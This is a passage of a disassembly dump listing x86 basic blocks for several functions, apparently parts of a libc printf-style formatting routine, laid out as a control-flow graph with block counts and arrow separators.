v
0xb056e50:	mov	eax, dword ptr [ebp - 0x1018]
0xb056e56:	mov	edx, dword ptr [eax]
0xb056e58:	test	edx, edx
0xb056e5a:	je	0xb056dce
None
|
|
|
v
0xb05aef1:	add	eax, 1
0xb05aef4:	jne	0xb059967
None
|
|
|
v
0xb058da8:	mov	eax, dword ptr [ebp + 8]
0xb058dab:	mov	dword ptr [esp + 8], edx
0xb058daf:	mov	dword ptr [esp + 4], 0x20
0xb058db7:	mov	dword ptr [ebp - 0x1040], edx
0xb058dbd:	mov	dword ptr [esp], eax
0xb058dc0:	call	0xb0699f0
None
|
|
|
v
0xb059703:	lea	edi, dword ptr [eax*4 + 0x80]
0xb05970a:	cmp	edi, 0x1000
0xb059710:	ja	0xb05ae6f
None
|
|
|
v
0xb0599a8:	cmp	dword ptr [ebp - 0x101c], 0x7ffffffe
0xb0599b2:	je	0xb0571e6
None
|
|
|
v
0xb059716:	mov	edx, dword ptr [ebp - 0x1048]
0xb05971c:	lea	eax, dword ptr [edi + 0x1e]
0xb05971f:	mov	ecx, dword ptr [ebp - 0x1040]
0xb059725:	and	eax, 0xfffffff0
0xb059728:	sub	esp, eax
0xb05972a:	lea	edi, dword ptr [esp + 0x23]
0xb05972e:	and	edi, 0xfffffff0
0xb059731:	lea	eax, dword ptr [edx*4 + 0x80]
0xb059738:	cmp	edx, ecx
0xb05973a:	lea	edx, dword ptr [ecx*4 + 0x80]
0xb059741:	cmovl	eax, edx
0xb059744:	add	edi, eax
0xb059746:	mov	dword ptr [ebp - 0x1038], 0
0xb059750:	cmp	dword ptr [ebp - 0x10a0], 0xff
0xb05975a:	jg	0xb059830
None
|
|
|
v
0xb059e03:	mov	esi, edi
0xb059e05:	mov	edx, eax
0xb059e07:	sub	esi, 4
0xb059e0a:	and	edx, 0xf
0xb059e0d:	mov	edx, dword ptr [ecx + edx*4]
0xb059e10:	shr	eax, 4
0xb059e13:	test	eax, eax
0xb059e15:	mov	dword ptr [esi], edx
0xb059e17:	jne	0xb059e05
None
|
|
|
v
0xb0596df:	mov	dword ptr [esi], eax
0xb0596e1:	mov	dword ptr [ebp - 0x1040], eax
0xb0596e7:	mov	eax, dword ptr [ebp - 0x1048]
0xb0596ed:	mov	ecx, dword ptr [ebp - 0x1040]
0xb0596f3:	cmp	ecx, eax
0xb0596f5:	cmovge	eax, ecx
0xb0596f8:	cmp	eax, 0x3c8
0xb0596fd:	jle	0xb059870
None
|
|
|
v
0xb0598f0:	lea	ecx, dword ptr [edx + 4]
0xb0598f3:	mov	dword ptr [eax + 0x10], ecx
0xb0598f6:	mov	dword ptr [edx], 0x2d
0xb0598fc:	cmp	dword ptr [ebp - 0x101c], 0x7fffffff
0xb059906:	je	0xb0571e6
None
|
|
|
v
0xb059e05:	mov	edx, eax
0xb059e07:	sub	esi, 4
0xb059e0a:	and	edx, 0xf
0xb059e0d:	mov	edx, dword ptr [ecx + edx*4]
0xb059e10:	shr	eax, 4
0xb059e13:	test	eax, eax
0xb059e15:	mov	dword ptr [esi], edx
0xb059e17:	jne	0xb059e05
None
|
|
|
v
0xb059207:	add	edi, 1
0xb05920a:	mov	eax, dword ptr [ebp - 0x1040]
0xb059210:	cmp	dword ptr [ebp - 0x103c], eax
0xb059216:	jb	0xb0591c0
None
|
|
|
v
0xb05983e:	movzx	eax, byte ptr [ebx + eax - 0x4f8e0]
0xb059846:	lea	esi, dword ptr [ebx - 0x152616]
0xb05984c:	mov	eax, dword ptr [ebx + eax*4 - 0x4fc60]
0xb059853:	add	eax, esi
0xb059855:	jmp	eax
None
|
|
|
v
0xb058390:	cmp	dword ptr [ebp - 0x101c], 0
0xb058397:	js	0xb05b48a
None
|
|
|
v
0xb057215:	mov	esi, dword ptr [ebp - 0x1038]
0xb05721b:	test	esi, esi
0xb05721d:	je	0xb056dce
None
|
|
|
v
0xb056c71:	add	ebx, 0x15438f
0xb056c77:	sub	esp, 0x10dc
0xb056c7d:	mov	dword ptr [ebp - 0x1024], eax
0xb056c83:	mov	ecx, dword ptr [ebx - 0xdc]
0xb056c89:	mov	eax, dword ptr [eax + ecx]
0xb056c8c:	mov	dword ptr [esp + 4], 1
0xb056c94:	mov	dword ptr [ebp - 0x102c], eax
0xb056c9a:	mov	eax, dword ptr [ebp + 8]
0xb056c9d:	mov	dword ptr [esp], eax
0xb056ca0:	call	0xb066ae0
None
|
|
|
v
0xb05ad45:	mov	eax, dword ptr [ebp + 8]
0xb05ad48:	mov	dword ptr [esp + 4], esi
0xb05ad4c:	mov	dword ptr [esp], eax
0xb05ad4f:	call	0xb06a320
None
|
|
|
v
0xb056e6e:	mov	esi, dword ptr [ebx + 0x376c]
0xb056e74:	test	esi, esi
0xb056e76:	jne	0xb05816f
None
|
|
|
v
0xb0591c0:	add	dword ptr [ebp - 0x103c], 4
0xb0591c7:	mov	eax, dword ptr [ebp - 0x103c]
0xb0591cd:	mov	ecx, dword ptr [eax - 4]
0xb0591d0:	mov	eax, dword ptr [ebp + 8]
0xb0591d3:	mov	eax, dword ptr [eax + 0x58]
0xb0591d6:	test	eax, eax
0xb0591d8:	je	0xb05ad8c
None
|
|
|
v
0xb059870:	lea	edi, dword ptr [ebp - 0x18]
0xb059873:	mov	dword ptr [ebp - 0x1038], 0
0xb05987d:	jmp	0xb059750
None
|
|
|
v
0xb059d90:	cmp	edx, 8
0xb059d93:	mov	esi, edi
0xb059d95:	je	0xb059deb
None
|
|
|
v
0xb05b50a:	test	edi, edi
0xb05b50c:	jle	0xb05b5a3
None
|
|
|
v
0xb0599e7:	mov	ecx, dword ptr [ebp - 0x1040]
0xb0599ed:	cmp	ecx, eax
0xb0599ef:	jne	0xb0571e6
None
|
|
|
v
0xb059482:	cmp	eax, 0xff
0xb059485:	jne	0xb059568
None
|
|
|
v
0xb05857c:	cmp	dword ptr [ebp - 0x1044], 0x10
0xb058583:	lea	eax, dword ptr [edi - 2]
0xb058586:	sete	dl
0xb058589:	test	dl, dl
0xb05858b:	cmovne	edi, eax
0xb05858e:	mov	eax, dword ptr [ebp - 0x10a8]
0xb058594:	or	eax, dword ptr [ebp - 0x10a4]
0xb05859a:	or	eax, dword ptr [ebp - 0x10ac]
0xb0585a0:	cmp	eax, 1
0xb0585a3:	adc	edi, -1
0xb0585a6:	cmp	byte ptr [ebp - 0x104a], 0x20
0xb0585ad:	je	0xb05b50a
None
|
|
|
v
0xb058dc5:	mov	edx, dword ptr [ebp - 0x1040]
0xb058dcb:	cmp	edx, eax
0xb058dcd:	jne	0xb0571e6
None
|
|
|
v
0xb05b561:	mov	eax, dword ptr [ebp + 8]
0xb05b564:	mov	dword ptr [esp + 4], 0x2d
0xb05b56c:	mov	dword ptr [esp], eax
0xb05b56f:	call	0xb06a320
None
|
|
|
v
0xb05b00b:	cmp	dword ptr [ebp - 0x10a8], 0
0xb05b012:	je	0xb0585fd
None
|
|
|
v
0xb057207:	mov	edi, dword ptr [ebp - 0x105c]
0xb05720d:	test	edi, edi
0xb05720f:	jne	0xb059cf9
None
|
|
|
v
0xb058da4:	test	edx, edx
0xb058da6:	je	0xb058dfa
None
|
|
|
v
0xb0593a8:	add	dword ptr [ebp - 0x1038], 1
0xb0593af:	add	esi, 0x34
0xb0593b2:	mov	eax, dword ptr [ebp - 0x1034]
0xb0593b8:	cmp	dword ptr [ebp - 0x1038], eax
0xb0593be:	je	0xb059438
None
|
|
|
v
0xb058309:	cmp	dword ptr [ebp - 0x1038], 0x1000
0xb058313:	ja	0xb05ae22
None
|
|
|
v
0xb059d07:	jmp	0xb057215
None
|
|
|
v
0xb05b1d7:	mov	edx, dword ptr [eax + 0x10]
0xb05b1da:	cmp	edx, dword ptr [eax + 0x14]
0xb05b1dd:	jae	0xb05b452
None
|
|
|
v
0xb05b04e:	add	eax, 1
0xb05b051:	jne	0xb058646
None
|
|
|
v
0xb058ecf:	jmp	0xb058383
None
|
|
|
v
0xb059db4:	cmp	dword ptr [ebp - 0x1044], 0xa
0xb059dbb:	jne	0xb0584fe
None
|
|
|
v
0xb0594ea:	mov	eax, dword ptr [ebp - 0x1014]
0xb0594f0:	fld	xword ptr [eax]
0xb0594f2:	lea	edx, dword ptr [eax + 0xc]
0xb0594f5:	mov	dword ptr [ebp - 0x1014], edx
0xb0594fb:	fstp	xword ptr [edi]
0xb0594fd:	lea	esi, dword ptr [esi]
0xb059500:	add	esi, 1
0xb059503:	add	edi, 0xc
0xb059506:	cmp	esi, dword ptr [ebp - 0x103c]
0xb05950c:	jne	0xb059460
None
|
|
|
v
0xb059a94:	mov	eax, dword ptr [ebp + 8]
0xb059a97:	mov	dword ptr [esp + 8], edi
0xb059a9b:	mov	dword ptr [esp + 4], 0x20
0xb059aa3:	mov	dword ptr [esp], eax
0xb059aa6:	call	0xb0699f0
None
|
|
|
v
0xb059390:	mov	edx, dword ptr [esi + 0x28]
0xb059393:	mov	eax, dword ptr [esi + 0x24]
0xb059396:	mov	edi, dword ptr [ebp - 0x1040]
0xb05939c:	mov	dword ptr [ecx + eax*4], edx
0xb05939f:	mov	edx, dword ptr [esi + 0x30]
0xb0593a2:	mov	eax, dword ptr [esi + 0x24]
0xb0593a5:	mov	dword ptr [edi + eax*4], edx
0xb0593a8:	add	dword ptr [ebp - 0x1038], 1
0xb0593af:	add	esi, 0x34
0xb0593b2:	mov	eax, dword ptr [ebp - 0x1034]
0xb0593b8:	cmp	dword ptr [ebp - 0x1038], eax
0xb0593be:	je	0xb059438
None
|
|
|
v
0xb0593d7:	mov	dword ptr [ecx + eax*4], 0
0xb0593de:	mov	eax, dword ptr [esi + 0x2c]
0xb0593e1:	test	eax, eax
0xb0593e3:	je	0xb0593a8
None
|
|
|
v
0xb058656:	mov	eax, dword ptr [ebp + 8]
0xb058659:	mov	eax, dword ptr [eax + 0x58]
0xb05865c:	test	eax, eax
0xb05865e:	je	0xb05afc7
None
|
|
|
v
0xb05aede:	mov	eax, dword ptr [ebp + 8]
0xb05aee1:	mov	dword ptr [esp + 4], 0x30
0xb05aee9:	mov	dword ptr [esp], eax
0xb05aeec:	call	0xb06a320
None
|
|
|
v
0xb058d0f:	cmp	dword ptr [ebp - 0x1040], 0x3fffffff
0xb058d19:	ja	0xb058740
None
|
|
|
v
0xb05b89d:	jmp	0xb0571e6
None
|
|
|
v
0xb059530:	cmp	eax, 7
0xb059533:	jg	0xb059568
None
|
|
|
v
0xb059382:	mov	dword ptr [ebp - 0x1038], edi
0xb059388:	jmp	0xb0593c0
None
|
|
|
v
0xb058cdb:	cmp	dword ptr [ebp - 0x10b8], 0
0xb058ce2:	jne	0xb05a287
None
|
|
|
v
0xb05b3fd:	mov	ecx, dword ptr [ebp - 0x1040]
0xb05b403:	xor	eax, eax
0xb05b405:	mov	edi, esi
0xb05b407:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0xb056dee:	mov	ecx, dword ptr [ebp - 0x1020]
0xb056df4:	test	ecx, ecx
0xb056df6:	jne	0xb056fa9
None
|
|
|
v
0xb05816f:	mov	byte ptr [ebp - 0x1049], 0
0xb058176:	mov	dword ptr [ebp - 0x105c], 0
0xb058180:	mov	dword ptr [ebp - 0x1064], 0
0xb05818a:	mov	dword ptr [ebp - 0x1054], 0
0xb058194:	mov	dword ptr [ebp - 0x1038], 0
0xb05819e:	mov	dword ptr [ebp - 0x1050], 0xffffffff
0xb0581a8:	mov	dword ptr [ebp - 0x1058], 0
0xb0581b2:	sub	esp, 0x690
0xb0581b8:	lea	eax, dword ptr [esp + 0x23]
0xb0581bc:	and	eax, 0xfffffff0
0xb0581bf:	mov	dword ptr [ebp - 0x1030], eax
0xb0581c5:	mov	eax, dword ptr [ebp - 0x1038]
0xb0581cb:	mov	dword ptr [ebp - 0x1010], 0
0xb0581d5:	test	eax, eax
0xb0581d7:	jne	0xb05aeff
None
|
|
|
v
0xb0586d9:	mov	eax, 0x7fffffff
0xb0586de:	sub	eax, ecx
0xb0586e0:	add	dword ptr [ebp - 0x101c], edi
0xb0586e6:	cmp	edi, eax
0xb0586e8:	ja	0xb058740
None
|
|
|
v
0xb0596c3:	mov	eax, dword ptr [esi + 0x1c]
0xb0596c6:	cmp	eax, 0xff
0xb0596c9:	je	0xb0596e7
None
|
|
|
v
0xb0585c0:	mov	eax, dword ptr [ebp + 8]
0xb0585c3:	mov	eax, dword ptr [eax + 0x58]
0xb0585c6:	test	eax, eax
0xb0585c8:	je	0xb05b561
None
|
|
|
v
0xb0597ad:	mov	eax, dword ptr [ebp - 0x103c]
0xb0597b3:	imul	edx, dword ptr [esi + 0x24], 0xc
0xb0597b7:	add	edx, dword ptr [ebp - 0x1060]
0xb0597bd:	add	ecx, eax
0xb0597bf:	mov	dword ptr [eax], edx
0xb0597c1:	add	eax, 4
0xb0597c4:	add	edx, 0xc
0xb0597c7:	cmp	eax, ecx
0xb0597c9:	jne	0xb0597bf
None
|
|
|
v
0xb058981:	lea	esi, dword ptr [edi - 4]
0xb058984:	mov	dword ptr [edi - 4], 0x30
0xb05898b:	mov	byte ptr [ebp - 0x104a], 0x20
0xb058992:	mov	dword ptr [ebp - 0x1044], 8
0xb05899c:	jmp	0xb0584fe
None
|
|
|
v
0xb0571e6:	mov	dword ptr [ebp - 0x101c], 0xffffffff
0xb0571f0:	cmp	byte ptr [ebp - 0x1049], 0
0xb0571f7:	je	0xb057207
None
|
|
|
v
0xb056d31:	mov	eax, dword ptr [ebx - 0x60]
0xb056d37:	mov	dword ptr [ebp - 0xff8], eax
0xb056d3d:	mov	eax, dword ptr [ebp + 8]
0xb056d40:	mov	dword ptr [ebp - 0xff4], eax
0xb056d46:	mov	eax, dword ptr [ebp + 8]
0xb056d49:	mov	esi, dword ptr gs:[8]
0xb056d50:	mov	edx, dword ptr [eax + 0x48]
0xb056d53:	cmp	esi, dword ptr [edx + 8]
0xb056d56:	je	0xb056d82
None
|
|
|
v
0xb059500:	add	esi, 1
0xb059503:	add	edi, 0xc
0xb059506:	cmp	esi, dword ptr [ebp - 0x103c]
0xb05950c:	jne	0xb059460
None
|
|
|
v
0xb05ad62:	lea	eax, dword ptr [ebx - 0x4a558]
0xb05ad68:	mov	dword ptr [esp + 0xc], eax
0xb05ad6c:	mov	dword ptr [esp + 8], 0x81a
0xb05ad74:	lea	eax, dword ptr [ebx - 0x4a72d]
0xb05ad7a:	mov	dword ptr [esp + 4], eax
0xb05ad7e:	lea	eax, dword ptr [ebx - 0x45d60]
0xb05ad84:	mov	dword ptr [esp], eax
0xb05ad87:	call	0xb027820
None
|
|
|
v
0xb059d97:	xor	edx, edx
0xb059d99:	sub	esi, 4
0xb059d9c:	div	dword ptr [ebp - 0x1044]
0xb059da2:	mov	edx, dword ptr [ecx + edx*4]
0xb059da5:	test	eax, eax
0xb059da7:	mov	dword ptr [esi], edx
0xb059da9:	jne	0xb059d97
None
|
|
|
v
0xb059592:	mov	ecx, dword ptr [ebp - 0x1024]
0xb059598:	mov	eax, dword ptr [ebx - 0x134]
0xb05959e:	mov	eax, dword ptr [ecx + eax]
0xb0595a1:	mov	eax, dword ptr [eax + 4]
0xb0595a4:	mov	ecx, dword ptr [eax + 0x34]
0xb0595a7:	mov	eax, dword ptr [eax + 0x2c]
0xb0595aa:	mov	dword ptr [ebp - 0x1058], ecx
0xb0595b0:	mov	dword ptr [ebp - 0x1050], eax
0xb0595b6:	movzx	eax, byte ptr [eax]
0xb0595b9:	cmp	al, 0x7f
0xb0595bb:	je	0xb0595c5
None
|
|
|
v
0xb05925c:	add	edi, 1
0xb05925f:	cmp	dword ptr [ebp - 0x101c], 0x7ffffffe
0xb059269:	ja	0xb05ad62
None
|
|
|
v
0xb059934:	cmp	dword ptr [ebp - 0x1044], 0x10
0xb05993b:	jne	0xb0599c6
None
|
|
|
v
0xb0585ce:	mov	edx, dword ptr [eax + 0x10]
0xb0585d1:	cmp	edx, dword ptr [eax + 0x14]
0xb0585d4:	jae	0xb05b561
None
|
|
|
v
0xb05976e:	mov	ecx, dword ptr [ebp - 0x10a0]
0xb059774:	lea	edx, dword ptr [ecx*4]
0xb05977b:	mov	dword ptr [ebp - 0x1044], edx
0xb059781:	mov	edx, dword ptr [eax + ecx*4]
0xb059784:	test	edx, edx
0xb059786:	je	0xb059830
None
|
|
|
v
0xb058e85:	mov	edx, dword ptr [ebp - 0x1040]
0xb058e8b:	cmp	edx, eax
0xb058e8d:	jne	0xb0571e6
None
|
|
|
v
0xb059967:	cmp	dword ptr [ebp - 0x101c], 0x7fffffff
0xb059971:	je	0xb0571e6
None
|
|
|
v
0xb0583d4:	mov	edx, dword ptr [esi + 0x18]
0xb0583d7:	sub	edx, dword ptr [esi + 0x14]
0xb0583da:	mov	dword ptr [ebp - 0x1038], 0
0xb0583e4:	sar	edx, 2
0xb0583e7:	cmp	eax, edx
0xb0583e9:	jne	0xb0571e6
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b05b950
TOTAL BLOCKS :31
0xb05bb37:	jmp	0xb05ba22
None
|
|
|
v
0xb05ba3e:	mov	ecx, 1
0xb05ba43:	cmp	dword ptr gs:[0xc], 0
0xb05ba4b:	je	0xb05ba4e
None
|
|
|
v
0xb05bab1:	mov	edx, dword ptr [esi + 0x48]
0xb05bab4:	sub	dword ptr [edx + 4], 1
0xb05bab8:	jne	0xb05bad5
None
|
|
|
v
0xb05bad5:	test	ebp, ebp
0xb05bad7:	jne	0xb05bae8
None
|
|
|
v
0xb05bb7b:	jmp	0xb05bad5
None
|
|
|
v
0xb05bacb:	lock sub	dword ptr [edx], 1
None
|
|
|
v
0xb05ba4d:	lock cmpxchg	dword ptr [edx], ecx
0xb05ba51:	jne	0xb05bb68
None
|
|
|
v
0xb05b984:	lea	eax, dword ptr [esp + 0xc4]
0xb05b98b:	mov	dword ptr [esp + 0x84], eax
0xb05b992:	lea	eax, dword ptr [esp + 0x190]
0xb05b999:	mov	dword ptr [esp + 0xd4], eax
0xb05b9a0:	lea	edx, dword ptr [esp + 0x2c]
0xb05b9a4:	mov	dword ptr [esp + 0xd0], eax
0xb05b9ab:	lea	eax, dword ptr [esp + 0x8190]
0xb05b9b2:	mov	dword ptr [esp + 0xd8], eax
0xb05b9b9:	mov	eax, dword ptr [esi + 0x3c]
0xb05b9bc:	mov	dword ptr [esp + 8], ebp
0xb05b9c0:	mov	dword ptr [esp + 4], edi
0xb05b9c4:	mov	dword ptr [esp], edx
0xb05b9c7:	mov	dword ptr [esp + 0x68], eax
0xb05b9cb:	lea	eax, dword ptr [ebx - 0xb20]
0xb05b9d1:	mov	dword ptr [esp + 0x180], esi
0xb05b9d8:	mov	dword ptr [esp + 0x94], 1
0xb05b9e3:	mov	dword ptr [esp + 0x2c], 0xfbad8004
0xb05b9eb:	mov	byte ptr [esp + 0x72], 0
0xb05b9f0:	mov	dword ptr [esp + 0x74], 0
0xb05b9f8:	mov	dword ptr [esp + 0xc0], eax
0xb05b9ff:	call	0xb056c60
None
|
|
|
v
0xb05b95f:	add	ebx, 0x14f6a1
0xb05b965:	sub	esp, 0x819c
0xb05b96b:	mov	dword ptr [esp + 4], 1
0xb05b973:	mov	dword ptr [esp], eax
0xb05b976:	call	0xb066ae0
None
|
|
|
v
0xb05baa9:	test	dword ptr [esi], 0x8000
0xb05baaf:	jne	0xb05bad5
None
|
|
|
v
0xb05ba7e:	movsx	eax, byte ptr [esi + 0x46]
0xb05ba82:	mov	dword ptr [esp + 0xc], edx
0xb05ba86:	mov	eax, dword ptr [esi + eax + 0x94]
0xb05ba8d:	mov	dword ptr [esp + 8], edx
0xb05ba91:	mov	dword ptr [esp + 4], ecx
0xb05ba95:	mov	dword ptr [esp], esi
0xb05ba98:	call	dword ptr [eax + 0x1c]
None
|
|
|
v
0xb05bad9:	add	esp, 0x819c
0xb05badf:	mov	eax, edi
0xb05bae1:	pop	ebx
0xb05bae2:	pop	esi
0xb05bae3:	pop	edi
0xb05bae4:	pop	ebp
0xb05bae5:	ret	
None
|
|
|
v
0xb05bacf:	jne	0xb05bb74
None
|
|
|
v
0xb05bb68:	lea	ecx, dword ptr [edx]
0xb05bb6a:	call	0xb0f9430
None
|
|
|
v
0xb05b97b:	cmp	eax, 1
0xb05b97e:	jne	0xb05bb40
None
|
|
|
v
0xb05ba2b:	mov	edx, dword ptr [esi + 0x48]
0xb05ba2e:	mov	ecx, dword ptr gs:[8]
0xb05ba35:	mov	dword ptr [esp + 0xc], ecx
0xb05ba39:	cmp	ecx, dword ptr [edx + 8]
0xb05ba3c:	je	0xb05ba64
None
|
|
|
v
0xb05ba22:	mov	eax, dword ptr [esi]
0xb05ba24:	and	eax, 0x8000
0xb05ba29:	jne	0xb05ba68
None
|
|
|
v
0xb05ba68:	mov	eax, dword ptr [esp + 0x84]
0xb05ba6f:	mov	ecx, dword ptr [eax + 0xc]
0xb05ba72:	mov	edx, dword ptr [eax + 0x10]
0xb05ba75:	sub	edx, ecx
0xb05ba77:	sar	edx, 2
0xb05ba7a:	test	edx, edx
0xb05ba7c:	jle	0xb05baa9
None
|
|
|
v
0xb05ba04:	mov	ebp, dword ptr [ebx + 0x38d8]
0xb05ba0a:	test	ebp, ebp
0xb05ba0c:	mov	edi, eax
0xb05ba0e:	jne	0xb05bb10
None
|
|
|
v
0xb05ba64:	add	dword ptr [edx + 4], 1
0xb05ba68:	mov	eax, dword ptr [esp + 0x84]
0xb05ba6f:	mov	ecx, dword ptr [eax + 0xc]
0xb05ba72:	mov	edx, dword ptr [eax + 0x10]
0xb05ba75:	sub	edx, ecx
0xb05ba77:	sar	edx, 2
0xb05ba7a:	test	edx, edx
0xb05ba7c:	jle	0xb05baa9
None
|
|
|
v
0xb05bb40:	add	esp, 0x819c
0xb05bb46:	mov	eax, 0xffffffff
0xb05bb4b:	pop	ebx
0xb05bb4c:	pop	esi
0xb05bb4d:	pop	edi
0xb05bb4e:	pop	ebp
0xb05bb4f:	ret	
None
|
|
|
v
0xb05baba:	mov	dword ptr [edx + 8], 0
0xb05bac1:	cmp	dword ptr gs:[0xc], 0
0xb05bac9:	je	0xb05bacc
None
|
|
|
v
0xb05ba9b:	mov	edx, dword ptr [esp + 0xc]
0xb05ba9f:	cmp	eax, edx
0xb05baa1:	mov	eax, 0xffffffff
0xb05baa6:	cmovne	edi, eax
0xb05baa9:	test	dword ptr [esi], 0x8000
0xb05baaf:	jne	0xb05bad5
None
|
|
|
v
0xb05ba14:	mov	eax, dword ptr [ebx - 0x60]
0xb05ba1a:	mov	dword ptr [esp + 0x20], esi
0xb05ba1e:	mov	dword ptr [esp + 0x1c], eax
0xb05ba22:	mov	eax, dword ptr [esi]
0xb05ba24:	and	eax, 0x8000
0xb05ba29:	jne	0xb05ba68
None
|
|
|
v
0xb05bae8:	lea	edx, dword ptr [esp + 0x1c]
0xb05baec:	mov	eax, dword ptr [ebx + 0x38bc]
0xb05baf2:	mov	dword ptr [esp + 4], 0
0xb05bafa:	ror	eax, 9
0xb05bafd:	xor	eax, dword ptr gs:[0x18]
0xb05bb04:	mov	dword ptr [esp], edx
0xb05bb07:	call	eax
None
|
|
|
v
0xb05bb09:	jmp	0xb05bad9
None
|
|
|
v
0xb05bb74:	lea	eax, dword ptr [edx]
0xb05bb76:	call	0xb0f9460
None
|
|
|
v
0xb05b950:	push	ebp
0xb05b951:	mov	ebp, ecx
0xb05b953:	push	edi
0xb05b954:	mov	edi, edx
0xb05b956:	push	esi
0xb05b957:	mov	esi, eax
0xb05b959:	push	ebx
0xb05b95a:	call	0xb1267db
None
|
|
|
v
0xb05bb6f:	jmp	0xb05ba57
None
|
|
|
v
0xb05ba57:	mov	eax, dword ptr [esi + 0x48]
0xb05ba5a:	mov	ecx, dword ptr [esp + 0xc]
0xb05ba5e:	mov	edx, dword ptr [esi + 0x48]
0xb05ba61:	mov	dword ptr [eax + 8], ecx
0xb05ba64:	add	dword ptr [edx + 4], 1
0xb05ba68:	mov	eax, dword ptr [esp + 0x84]
0xb05ba6f:	mov	ecx, dword ptr [eax + 0xc]
0xb05ba72:	mov	edx, dword ptr [eax + 0x10]
0xb05ba75:	sub	edx, ecx
0xb05ba77:	sar	edx, 2
0xb05ba7a:	test	edx, edx
0xb05ba7c:	jle	0xb05baa9
None
|
|
|
v
0xb05bb10:	mov	edx, dword ptr [ebx - 0x60]
0xb05bb16:	mov	eax, dword ptr [ebx + 0x38b8]
0xb05bb1c:	mov	dword ptr [esp + 8], esi
0xb05bb20:	ror	eax, 9
0xb05bb23:	xor	eax, dword ptr gs:[0x18]
0xb05bb2a:	mov	dword ptr [esp + 4], edx
0xb05bb2e:	lea	edx, dword ptr [esp + 0x1c]
0xb05bb32:	mov	dword ptr [esp], edx
0xb05bb35:	call	eax
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b062590
TOTAL BLOCKS :8
0xb0625d1:	cmp	ecx, 0xccccccc
0xb0625d7:	jle	0xb0625a8
None
|
|
|
v
0xb0625cd:	test	ecx, ecx
0xb0625cf:	js	0xb0625bd
None
|
|
|
v
0xb0625c0:	mov	dword ptr [eax], edx
0xb0625c2:	movzx	esi, byte ptr [edx]
0xb0625c5:	sub	esi, 0x30
0xb0625c8:	cmp	esi, 9
0xb0625cb:	ja	0xb0625e0
None
|
|
|
v
0xb0625d9:	mov	ecx, 0xffffffff
0xb0625de:	jmp	0xb0625bd
None
|
|
|
v
0xb0625e0:	pop	esi
0xb0625e1:	mov	eax, ecx
0xb0625e3:	pop	edi
0xb0625e4:	pop	ebp
0xb0625e5:	ret	
None
|
|
|
v
0xb062590:	push	ebp
0xb062591:	push	edi
0xb062592:	mov	edi, 0x7fffffff
0xb062597:	push	esi
0xb062598:	mov	edx, dword ptr [eax]
0xb06259a:	movzx	ecx, byte ptr [edx]
0xb06259d:	add	edx, 1
0xb0625a0:	sub	ecx, 0x30
0xb0625a3:	jmp	0xb0625c0
None
|
|
|
v
0xb0625a8:	lea	ebp, dword ptr [ecx + ecx*4]
0xb0625ab:	mov	ecx, edi
0xb0625ad:	sub	ecx, esi
0xb0625af:	add	ebp, ebp
0xb0625b1:	add	esi, ebp
0xb0625b3:	cmp	ebp, ecx
0xb0625b5:	mov	ecx, 0xffffffff
0xb0625ba:	cmovle	ecx, esi
0xb0625bd:	add	edx, 1
0xb0625c0:	mov	dword ptr [eax], edx
0xb0625c2:	movzx	esi, byte ptr [edx]
0xb0625c5:	sub	esi, 0x30
0xb0625c8:	cmp	esi, 9
0xb0625cb:	ja	0xb0625e0
None
|
|
|
v
0xb0625bd:	add	edx, 1
0xb0625c0:	mov	dword ptr [eax], edx
0xb0625c2:	movzx	esi, byte ptr [edx]
0xb0625c5:	sub	esi, 0x30
0xb0625c8:	cmp	esi, 9
0xb0625cb:	ja	0xb0625e0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0625f0
TOTAL BLOCKS :109
0xb062aef:	mov	dword ptr [esi + 0x28], 0x100
0xb062af6:	jmp	0xb0627e8
None
|
|
|
v
0xb0629ab:	mov	eax, dword ptr [esp + 0x34]
0xb0629af:	add	edi, 1
0xb0629b2:	mov	edx, ebp
0xb0629b4:	mov	dword ptr [esp + 0x30], ebp
0xb0629b8:	mov	dword ptr [esi + 0x1c], eax
0xb0629bb:	add	eax, 1
0xb0629be:	mov	dword ptr [esp + 0x34], eax
0xb0629c2:	jmp	0xb0626c3
None
|
|
|
v
0xb062a13:	test	eax, eax
0xb062a15:	je	0xb062a20
None
|
|
|
v
0xb062ba9:	cmp	eax, 0x41
0xb062bac:	je	0xb062ad4
None
|
|
|
v
0xb062936:	cmp	eax, 0xff
0xb062939:	je	0xb062952
None
|
|
|
v
0xb0626df:	lea	ecx, dword ptr [edx + 1]
0xb0626e2:	mov	dword ptr [esp + 0x30], ecx
0xb0626e6:	movzx	eax, byte ptr [edx]
0xb0626e9:	sub	eax, 0x4c
0xb0626ec:	cmp	al, 0x2e
0xb0626ee:	ja	0xb062978
None
|
|
|
v
0xb062ac3:	mov	dword ptr [esi + 0x2c], 0
0xb062aca:	jmp	0xb0627e8
None
|
|
|
v
0xb062afb:	mov	dword ptr [esi + 0x28], 7
0xb062b02:	jmp	0xb0627e8
None
|
|
|
v
0xb0628c9:	mov	edx, dword ptr [esp + 0x30]
0xb0628cd:	jmp	0xb0626ad
None
|
|
|
v
0xb0627a8:	cmp	eax, 0x47
0xb0627ab:	jle	0xb062ba0
None
|
|
|
v
0xb0627c0:	cmp	eax, 0x61
0xb0627c3:	je	0xb062ad4
None
|
|
|
v
0xb06267f:	mov	dword ptr [esi + 0x10], 0x20
0xb062686:	mov	dword ptr [esi + 0x20], 0xffffffff
0xb06268d:	mov	dword ptr [esi + 4], 0
0xb062694:	movzx	eax, byte ptr [edx]
0xb062697:	cmp	al, 0x2a
0xb062699:	je	0xb062880
None
|
|
|
v
0xb06298d:	mov	dword ptr [esi], eax
0xb06298f:	mov	edx, dword ptr [esp + 0x30]
0xb062993:	jmp	0xb0626c3
None
|
|
|
v
0xb062aab:	mov	ecx, dword ptr [esp + 0x34]
0xb062aaf:	add	edi, edx
0xb062ab1:	mov	dword ptr [esi + 0x24], ecx
0xb062ab4:	jmp	0xb0627f2
None
|
|
|
v
0xb062978:	mov	eax, ecx
0xb06297a:	jmp	0xb062771
None
|
|
|
v
0xb062771:	mov	dword ptr [esp + 0x30], eax
0xb062775:	movzx	eax, byte ptr [edx]
0xb062778:	cmp	dword ptr [ebx + 0x3768], 0
0xb06277f:	mov	dword ptr [esi + 0x30], 0xffffffff
0xb062786:	mov	dword ptr [esi + 8], eax
0xb062789:	jne	0xb062b61
None
|
|
|
v
0xb0626c3:	and	byte ptr [esi + 0xd], 0xfd
0xb0626c7:	xor	ecx, ecx
